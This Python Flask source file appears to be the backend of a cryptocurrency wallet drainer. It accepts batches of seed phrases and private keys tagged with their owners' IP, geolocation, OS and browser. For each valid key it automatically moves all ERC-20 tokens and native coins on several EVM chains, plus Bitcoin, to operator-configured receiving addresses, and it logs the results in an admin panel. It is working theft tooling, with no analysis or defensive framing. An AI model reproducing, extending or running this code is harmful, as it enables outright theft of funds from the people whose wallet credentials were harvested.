from requests.sessions import Request
from web3 import Web3
from eth_account import Account
from flask import Flask, request, redirect, render_template, session, flash
from termcolor import colored
from hdwallet import HDWallet
from typing import Optional
from hdwallet.symbols import *
from bit import Key, PrivateKeyTestnet
from flask_sqlalchemy import SQLAlchemy
from bip_utils import Bip39MnemonicValidator
from datetime import datetime, timedelta
import hashlib
import json
import sys
import time
import threading
import sys
import requests
import random
from config import *
from main import *


EIP20_ABI = json.loads('[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_owner","type":"address"},{"indexed":true,"name":"_spender","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Approval","type":"event"}]')  # noqa: 501

# Connects to the given global network
def connect(network:str):
    web3 = Web3(Web3.HTTPProvider(network))
    return web3

# Gets address balance from the given network
def checkBalance(connection, address:str):
    return connection.eth.get_balance(address)

# Returns public address from private key
def pubAddr(privKey:str):
    try:
        acc = Account.from_key(privKey)
    except:
        return ''
    return acc.address

#Extract JSON data of all token from local data
def extractTokensLocally(addr:str, net:str):
    addr = Web3.toChecksumAddress(addr)
    resp=[]
    web3 = connect(RPC_links[net])
    for cont in ContractAddresses[net]:
        if len(cont)>0:
            contAdd = Web3.toChecksumAddress(cont[1])
            unicorns = web3.eth.contract(address=contAdd, abi=EIP20_ABI)
            value = unicorns.functions.balanceOf(addr).call()
            if value > 0:
                respDic = {
                    'token_address': contAdd,
                    'decimals':unicorns.functions.decimals().call(),
                    'name':cont[0],
                    'symbol':cont[0],
                    'balance':value
                }
                resp.append(respDic)
    return resp

# Get the tokens with their balance
def getTokens(net:str,addr:str, header:dict):
    contLL=[]
    if net in moralisNetMap:
        netMoralis = moralisNetMap[net]
        allERC20bal = 'https://deep-index.moralis.io/api/v2/'+ addr + '/erc20?chain=' + netMoralis
        response = requests.request("GET", allERC20bal, headers=header)
        try:
            tokenResp = response.json()
        except:
            print(str(sys.exc_info()[1]))
            print("Line: 97 ,tokenResp[:Dictionary] set to null",response, net, addr)
            tokenResp={}
    else:
        print("ewew",addr,net)
        tokenResp = extractTokensLocally(addr, net)
    for addDict in tokenResp:
        add = addDict['token_address']
        addDeci = int(addDict['decimals'])
        if net in moralisNetMap:
            netMoralis = moralisNetMap[net]
            tokenPrice = 'https://deep-index.moralis.io/api/v2/erc20/'+ add + '/price?chain=' + netMoralis
            response = requests.request("GET", tokenPrice, headers=header)
            respPrice = response.json()
            try:
                price = float(respPrice['usdPrice'])
                exchange = respPrice['exchangeName']

            except:
                print(net, respPrice, addDict['name'], add)
                price = 0
                exchange = 'unable to find'
        else:
            price = 0.01
            exchange = ''
        # contLL.append([price*addDict['balance'], add, price, addDict['name'], addDict['symbol']])
        contDict = {
            'worth': format(price*float(addDict['balance'])/(10**addDeci), '.2f'),#in dollar
            'token_address': add, 
            'price': price, 
            'exchange':exchange,
            'name': addDict['name'],
            'symbol': addDict['symbol'],
        }
        contLL.append(contDict)
    # contLL = sorted(contLL)[::-1]
    return contLL

# sends native coins to another wallet
def nativeTransaction(web3, net, fromKey: str, toAddr: str, nonceInc:int, data=''):
    fromAddr = pubAddr(fromKey)  # Gets the sender's address
    nonce = web3.eth.getTransactionCount(fromAddr)  # Gets the nonce value
    gasPrice = web3.eth.gasPrice
    value = web3.eth.get_balance(fromAddr)-21000*gasPrice
    tx = {
        'chainId': chainIdDict[net],
        'nonce': nonce+nonceInc,
        'to': toAddr,
        'value': value,
        'gas': 21000,
        'gasPrice': gasPrice,
        'data' : data
    }
    signed_tx = web3.eth.account.sign_transaction(tx, fromKey)  # Signs the transactions
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)  # Sends the transactions
    print(colored(Web3.toHex(tx_hash), 'magenta'))
    return Web3.toHex(tx_hash)

# sends the token from one address to other
def tokenTransaction(web3, net, contractAddress:str, fromAddr:str, fromKey:str, toAddr:str, nonceInc:int):
    unicorns = web3.eth.contract(address=contractAddress, abi=EIP20_ABI)
    value = unicorns.functions.balanceOf(fromAddr).call()
    nonce = web3.eth.getTransactionCount(fromAddr)+nonceInc
    gas = unicorns.functions.transfer(recAd(net),value).estimateGas({'from':fromAddr})
    gasPrice = web3.eth.gasPrice
    tx = {
        'chainId': chainIdDict[net],
        'gas': gas,
        'gasPrice': gasPrice,
        'nonce': nonce,
    }
    unicorn_txn = unicorns.functions.transfer(toAddr,value).buildTransaction(tx)
    signed_txn = web3.eth.account.signTransaction(unicorn_txn, private_key=fromKey)
    transHash = web3.eth.sendRawTransaction(signed_txn.rawTransaction) 
    print(colored(Web3.toHex(transHash),'cyan'))
    return Web3.toHex(transHash)

# send EVMs coins
def EVMde(net:str, privKey:str, rec:str):
    addr = pubAddr(privKey)
    w3 = connect(RPC_links[net])
    contList = filterTokens(getTokens(net, addr, moralisHeaders), net)
    cNonce=-1
    while contList:
        cNonce+=1
        contractInfo = contList.pop(0)
        contractAddress = Web3.toChecksumAddress(contractInfo['token_address'])
        #  checkBalance(w3, addr) > w3.eth.gasPrice
        try:
            print(f"extracting {contractInfo['name']} for {addr}")
            txHash=tokenTransaction(w3, net, contractAddress, addr, privKey, Web3.toChecksumAddress(recAd(net)),cNonce)
            rowCont = allLogsEVMs(privKey=privKey,network=net,type='contract',contAddress=contractAddress,contName=contractInfo['name'],contSymbol=contractInfo['symbol'],status='success',tx=txHash,worth=contractInfo['worth'],exchange=contractInfo['exchange'])
            db.session.add(rowCont)
        except:
            print(colored(net+str(sys.exc_info()[1])+' worth $'+str(contractInfo['worth'])+' of '+str(contractInfo['name']), 'red'))
            rowCont = allLogsEVMs(privKey=privKey,network=net,type='contract',contAddress=contractAddress,contName=contractInfo['name'],contSymbol=contractInfo['symbol'],status=str(sys.exc_info()[1]),tx='',worth=contractInfo['worth'],exchange=contractInfo['exchange'])
            db.session.add(rowCont)
        db.session.commit()
    try:
        time.sleep(3*Blocktime[net])
        txHash = nativeTransaction(w3, net, privKey, Web3.toChecksumAddress(rec),0)
        rowNative = allLogsEVMs(privKey=privKey,network=net,type='native',contAddress='',contName='',contSymbol='',status='success', tx=txHash,worth=checkBalance(w3, pubAddr(privKey))/10**18)
        db.session.add(rowNative)
        # c+=1
        # print(nativeTransaction(w3, privKey, Web3.toChecksumAddress(rec),c))
    except:
        if 'negative integers' in str(sys.exc_info()[1]).lower():
            print(colored(net+": Zero balance for "+addr, 'red'))
        else:
            rowNative = allLogsEVMs(privKey=privKey,network=net,type='native',contAddress='',contName='',contSymbol='',status=str(sys.exc_info()[1]),tx='',worth=checkBalance(w3, pubAddr(privKey))/10**18)
            db.session.add(rowNative)
            print(net, colored(str(sys.exc_info()[1])), 'red')
    db.session.commit()
    return net

# get private keys from mnemonic
def getKeyfromMnemonic(mnemonic:str, symb, arg):
    accDict={BTC:0, ETH:60, BTCTEST:1}
    LANGUAGE: str = "english"  
    MNEMONIC = mnemonic
    PASSPHRASE: Optional[str] = None  

    hdwallet: HDWallet = HDWallet(symbol=symb)
    hdwallet.from_mnemonic(
        mnemonic=MNEMONIC, language=LANGUAGE, passphrase=PASSPHRASE
    )

    hdwallet.from_index(44, hardened=True)
    hdwallet.from_index(accDict[symb], hardened=True)
    hdwallet.from_index(0, hardened=True)
    hdwallet.from_index(0)
    hdwallet.from_index(0)

    # dic = json.loads(hdwallet.dumps(), indent=4, ensure_ascii=False)
    dic = hdwallet.dumps()
    return dic[arg]

def send_BTC(net, mnemonic, recBTC):
    wif = getKeyfromMnemonic(mnemonic, net, 'wif')
    if net == BTC:
        my_key = Key(wif)
    else:
        my_key = PrivateKeyTestnet(wif)
        
    bal = int(my_key.get_balance())
    outputs = [(recBTC, bal-0, 'satoshi')]
    try:
        txHash = my_key.send(outputs)
        print(my_key.address, txHash)
        
    except:
        error =str(my_key.address)+ " BTC: "+  str(sys.exc_info()[1])
        if 'less than' in error.lower():
            argue = [str(error).split(' ')[1],str(error).split(' ')[5]]
            fee = int(argue[1]) - int(argue[0])
            print(my_key.address, bal,fee)
            outputs = [(recBTC, bal-fee, 'satoshi')]
            txHash = my_key.send(outputs)
            print(txHash)
            rowBTC = allLogsBTC(seed=mnemonic,wif=wif,status='success',tx=txHash, worth=bal, address=my_key.address)
            db.session.add(rowBTC)
            db.session.commit()
        else:
            if not "at least one unspent" in error.lower():
                print(my_key.address)
                rowBTC = allLogsBTC(seed=mnemonic,wif=wif,status=str(sys.exc_info()[1]),tx='',worth=bal, address=my_key.address)
                db.session.add(rowBTC)
                db.session.commit()
            print(error)

    return ""

def getUser():
    try:
        ses = session['id'].strip()
        return userHash(ses)
    except:
        return False

def recAd(net):
    rec = recAddresses.query.filter_by(network=net).first()
    if rec != None:
        return rec.address.strip()
    else:
        return ''

# def RPC_links(net):
#     rec = recAddresses.query.filter_by(network=net).first()
#     if rec != None:
#         return rec.rpc.strip()
#     else:
#         return ''


app = Flask(__name__)
app.config['SECRET_KEY'] = appSecretKey
app.config['SQLALCHEMY_DATABASE_URI'] = databaseURL
# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///local.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['PERMANENT_SESSION_LIFETIME'] =  timedelta(minutes=sessionTimeInMinutes)

db = SQLAlchemy(app)



class inputData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    seed = db.Column(db.Text)
    key = db.Column(db.String(100))
    date_created = db.Column(db.DateTime, default=datetime.utcnow())
    ip = db.Column(db.String(80))
    geo = db.Column(db.String(200))
    os = db.Column(db.String(200))
    received_date = db.Column(db.String(200))
    aggregator_name = db.Column(db.String(200))
    intype = db.Column(db.String(200))
    browser =  db.Column(db.String(200))
    remark =  db.Column(db.String(200))
    
    def __repr__(self):
        return '<Name %r>' % self.id()

class allLogsEVMs(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    privKey = db.Column(db.String(100), nullable=False)
    network = db.Column(db.String(100))
    date_created = db.Column(db.DateTime, default=datetime.utcnow())
    type = db.Column(db.String(100), nullable=False)
    contAddress = db.Column(db.String(100))
    contName = db.Column(db.String(100))
    contSymbol = db.Column(db.String(100))
    status = db.Column(db.String(100))
    worth = db.Column(db.Float)
    tx = db.Column(db.String(200))
    exchange = db.Column(db.String(100))
    
    def __repr__(self):
        return '<Name %r>' % self.id()

class allLogsBTC(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    seed = db.Column(db.Text)
    wif = db.Column(db.String(100), nullable=False)
    date_created = db.Column(db.DateTime, default=datetime.utcnow())
    status = db.Column(db.String(100))
    worth = db.Column(db.Float)
    tx = db.Column(db.String(200))
    address = db.Column(db.String(200))
    def __repr__(self):
        return '<Name %r>' % self.id()

class recAddresses(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    date_created = db.Column(db.DateTime, default=datetime.utcnow())
    network = db.Column(db.String(100), unique=True)
    address = db.Column(db.String(200))
    
    def __repr__(self):
        return '<Name %r>' % self.id()


@app.route('/')
def home():
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    else:
        error = ''
        return render_template('home.html', title='Home', error=error)


@app.route('/login', methods=['POST','GET'])
def login():    
    if request.method == 'POST':
        passcode = request.form['passcode']
        pass256 = hashlib.sha256(passcode.strip().encode()).hexdigest().lower()
        if userHash(pass256):
            session.permanent = True
            session['id'] = pass256
            return redirect('../')
        else:
            error = 'Wrong Passcode!'
    else:
        error = ''
    return render_template('login.html', error=error, title='login')


@app.route('/<string:type>', methods=['GET', 'POST'])
def devoid(type):
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    else:
        if request.method == 'POST': 
            if type.lower() == 'file':
                f = request.files['dataFile']  
                agg_name = request.form['agg_name']
                path = agg_name+'-'+str(random.randint(1000,9999))
                f.save(path)
                dic = {'dataPath':path, 'dataURL':'n', 'agg_name':agg_name, 'seed':'n'}
            elif type.lower() == 'url':
                dic = {'dataPath':'n', 'dataURL':request.form['dataURL'].strip(), 'agg_name':request.form['agg_name'].strip(), 'seed':'n'}
                if not validateTXTURL(dic['dataURL']):
                    error = 'Incorrect file(.txt) URL'
                    title = 'home'
                    return render_template('home.html', title = title, error=error )                
            elif type.lower()=='seed':
                dic = {'dataPath':'n', 'dataURL':'n', 'agg_name':request.form['agg_name'].strip(), 'seed': request.form['seed']}        
            else:
                return redirect('/logs')
            agg_name = dic['agg_name']
            dataURL = dic['dataURL']
            dataPath = dic['dataPath']
            seed = dic['seed']
            jsonArgList = processFile(agg_name,dataPath,dataURL,seed)
            if jsonArgList == False:
                error = "Unable to process file"
                print(error)
                title = 'home'
                return render_template('home.html', title = title, error=error )
            for jsonArg in jsonArgList:
                print('\n', jsonArg)
                
                mnemonic = jsonArg['mnemonic'].strip()
                GenPrivKey = jsonArg['key'].strip()
                
                if not Bip39MnemonicValidator().IsValid(mnemonic):
                    #if seed is invalid
                    print(colored('Invalid seed', 'red'))
                    print(mnemonic)
                    rowIn = inputData(seed=mnemonic,key='',aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='Invalid Mnemonic',browser=jsonArg['browser'])
                    db.session.add(rowIn)
                    db.session.commit()
                    if len(GenPrivKey) in [64, 66]:
                        #Validate the private key and do transactions
                        rowIn = inputData(seed='',key=GenPrivKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                        db.session.add(rowIn)
                        db.session.commit()                    
                        for net in EVMNetsOnMission:
                            if recAd(net)!='':
                                rec = recAd(net)
                                threading.Thread(target=EVMde, args=(net,GenPrivKey,rec)).start()
                else:
                    #if seed is valid
                    print("valid mnemonic: ", mnemonic)
                    recBTC = recAd('BTC')
                    threading.Thread(target=send_BTC, args=(BTC, mnemonic, recBTC)).start()
                
                    Account.enable_unaudited_hdwallet_features()
                    acc = Account.from_mnemonic(mnemonic)
                    privKey = acc.key.hex()
                    if GenPrivKey in privKey or privKey in GenPrivKey:
                        #If private key provided is same as private key derived from seed
                        rowIn = inputData(seed=mnemonic,key=privKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                        db.session.add(rowIn)
                        db.session.commit()                    
                        #BEP-20/ERC-20/Polygon and their testnet
                        for net in EVMNetsOnMission:
                            if recAd(net)!='':
                                rec = recAd(net)
                                threading.Thread(target=EVMde, args=(net,privKey,rec)).start()
                    else:
                        #If private key provided is not same as private key derived from seed
                        if len(GenPrivKey) in [64, 66]:
                            #Validate the private key and do transactions
                            rowIn = inputData(seed='',key=GenPrivKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                            db.session.add(rowIn)
                            db.session.commit()                    
                            for net in EVMNetsOnMission:
                                if recAd(net)!='':
                                    rec = recAd(net)
                                    threading.Thread(target=EVMde, args=(net,GenPrivKey,rec)).start()
                        elif len(privKey) in [64, 66]:
                            #Validate the private key and do transactions
                            rowIn = inputData(seed='',key=privKey,aggregator_name=jsonArg['aggregator_name'],ip=jsonArg['ip'],geo=jsonArg['geo'],os=jsonArg['os'],received_date=jsonArg['received_date'],remark='success',browser=jsonArg['browser'])
                            db.session.add(rowIn)
                            db.session.commit()                    
                            for net in EVMNetsOnMission:
                                if recAd(net)!='':
                                    rec = recAd(net)
                                    threading.Thread(target=EVMde, args=(net,privKey,rec)).start()                  
                        else:
                            print(colored("Bad request"),"red")

            return redirect('/logs')
        else:
            return redirect('/logs')

@app.route('/logs',methods=['POST', 'GET'])
def logs():
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    else:            
        title = 'logs'
        error = ''
        agg_name = ''
        if request.method == 'POST': 
            agg_name = request.form['agg_name'].strip()
            if userDic['id'] == agg_name or userDic['name'] == agg_name or userDic['type']=='admin':
                inData = inputData.query.order_by(inputData.id.desc())
                agg_name = userDic['name']
            else:
                error = 'Incorrect ID!'
                inData = ''
        else:
            agg_name = ''
            if userDic['type'] == 'admin':
                inData = inputData.query.order_by(inputData.id.desc())
            else:
                inData = ''
        return render_template('logs.html', title = title, error=error, data= inData, agg_name=agg_name)

@app.route('/view/<string:net>', methods=['GET', 'POST'])
def view(net):
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    else:    
        addFilter = request.args.get('address')        
        if addFilter == None:
            addFilter = ''
        if net.lower()=='evm':
            inData = allLogsEVMs.query.order_by(allLogsEVMs.id.desc())
            return render_template('evm.html', title='view '+net, data=inData, addFilter = addFilter)
        elif net.lower()=='btc':
            inData = allLogsBTC.query.order_by(allLogsBTC.id.desc())
            return render_template('btc.html', title='view '+net, data=inData, addFilter = addFilter)
        elif net.lower() in ['bsc_main', 'eth_main', 'polygon_main', 'avax_main', 'ftm_main', 'heco_main', 'hoo_main']:
            inData = allLogsEVMs.query.order_by(allLogsEVMs.id.desc())
            l=[]
            for data in inData:
                if data.network == net:
                    l.append(data)
            return render_template('evm.html', title='view '+net, data=l, addFilter = addFilter)  
                

@app.route('/action/<string:id>', methods=['POST', 'GET'])
def withdraw(id):
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    else:
        token = allLogsEVMs.query.get_or_404(id)
        contAdd = token.contAddress
        key = token.privKey 
        add = pubAddr(key)
        net = token.network
        web3 = connect(RPC_links[net])
        unicorns = web3.eth.contract(address=contAdd, abi=EIP20_ABI)
        value = unicorns.functions.balanceOf(add).call()
        gas = unicorns.functions.transfer(recAd(net),value).estimateGas({'from':add})
        gasPrice = web3.eth.gasPrice
        amount = format(gas*gasPrice/10**18)
        print(gas, gasPrice)
        if request.method == 'POST': 
            # if checkBalance(add, web3) >= gasPrice*gas:
            try:
                print(f"extracting {token.contName} for {add}")
                txHash=tokenTransaction(web3, net, contAdd, add, key, Web3.toChecksumAddress(recAd(net)),0)
                rowCont = allLogsEVMs(privKey=key,network=net,type='contract',contAddress=contAdd,contName=token.contName,contSymbol=token.contSymbol,status='success',tx=txHash,worth=token.worth,exchange=token.exchange)
                db.session.add(rowCont)
            except:
                print(colored(net+str(sys.exc_info()[1])+' worth $'+str(token.worth)+' of '+str(token.contName), 'red'))
                rowCont = allLogsEVMs(privKey=key,network=net,type='with draw token',contAddress=contAdd,contName=token.contName,contSymbol=token.contSymbol,status=str(sys.exc_info()[1]),tx='',worth=token.worth,exchange=token.exchange)
                db.session.add(rowCont)
            db.session.commit()
            return redirect('/view/'+net)
        else:
            return render_template('action.html', title='withdraw', error='', amount=amount, token=token, add=add)

@app.route('/configs')
def configs():
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    elif userDic['type'] != 'admin':
        flash('You do not have access')
        return redirect('/login')        
    else:
        recAddr = recAddresses.query.order_by(recAddresses.id)
        return render_template('configs.html', title='configs', data=recAddr, error='')

@app.route('/update/<int:id>',methods=['POST', 'GET'])
def update(id):
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    elif userDic['type'] != 'admin':
        flash('You do not have access')
        return redirect('/login') 
    else:
        addr_update = recAddresses.query.get_or_404(id)
        if request.method == 'POST':
            addr_update.address = request.form['address']
            try:
                db.session.commit()
                return redirect('/configs')
            except:
                return "error in updating to the database"
        else:
            title = 'update'
            return render_template('update_addr.html', title = title, addr_update = addr_update)

@app.route('/delete/<int:id>', methods=['POST', 'GET'])
def delete(id):
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    elif userDic['type'] != 'admin':
        flash('You do not have access')
        return redirect('/login')         
    else:
        addr_delete = recAddresses.query.get_or_404(id)
        try:
            db.session.delete(addr_delete)
            db.session.commit()
            return redirect('/configs')
        except:
            return "error in deleting to the database"

@app.route('/add',methods=['POST', 'GET'])
def add():
    userDic = getUser()
    if not userDic:
        return redirect('/login')
    elif userDic['type'] != 'admin':
        flash('You do not have access')
        return redirect('/login') 
    else:
        title = 'Update Configs'
        recAddr = recAddresses.query.order_by(recAddresses.id)
        addrAbsent=EVMNetsOnMission.copy()+['BTC']
        for each in recAddr:
            print(each.network)
            addrAbsent.remove(each.network)
        print(addrAbsent)
        if request.method == 'POST':
            address = request.form['address'].strip()
            network = request.form['network']
            if network != 'BTC':
                if not validateEVMAddress(address):
                    exc = 'Invalid Address'
                    error = f"while adding {address} for {network}. The following error occured: {exc}"
                    return render_template('add.html', title = title, error=error,addrAbsent=addrAbsent)
            address = Web3.toChecksumAddress(address)
            rowIn = recAddresses(address=address,network=network)
            try:
                db.session.add(rowIn)
                db.session.commit()
            except:
                exc = str(sys.exc_info()[1])
                error = f"while adding {address} for {network}, the following error occured: {exc} "
                return render_template('add.html', title = title, error=error,addrAbsent=addrAbsent)
            return redirect('/configs')
                
        else:
            return render_template('add.html', title=title, error='',addrAbsent=addrAbsent)

@app.context_processor
def utility_processor():
    def format_explorer_link(net):
        return explorerDic[net]
    def format_date(dateTime):
        return str(dateTime)[:-7]
    def format_error_string(error):
        if 'message'.lower() in error.lower():
            error=error.split(':')[-1]
            return error[:-1]
        return error
    def pubAddr(privKey:str):
        try:
            acc = Account.from_key(privKey)
            return acc.address
        except:
            return ''
    def format_error_color(s):
        if s.strip().lower()=='success':
            return 'green'
        elif 'insufficient fund' in s.strip().lower():
            return 'yellow'
        else:
            return 'red'
    return dict(format_explorer_link=format_explorer_link, pubAddr=pubAddr, format_error_color=format_error_color,format_error_string=format_error_string, format_date=format_date)

if __name__ == "__main__":
    # Launch the Flask dev server
    app.run()
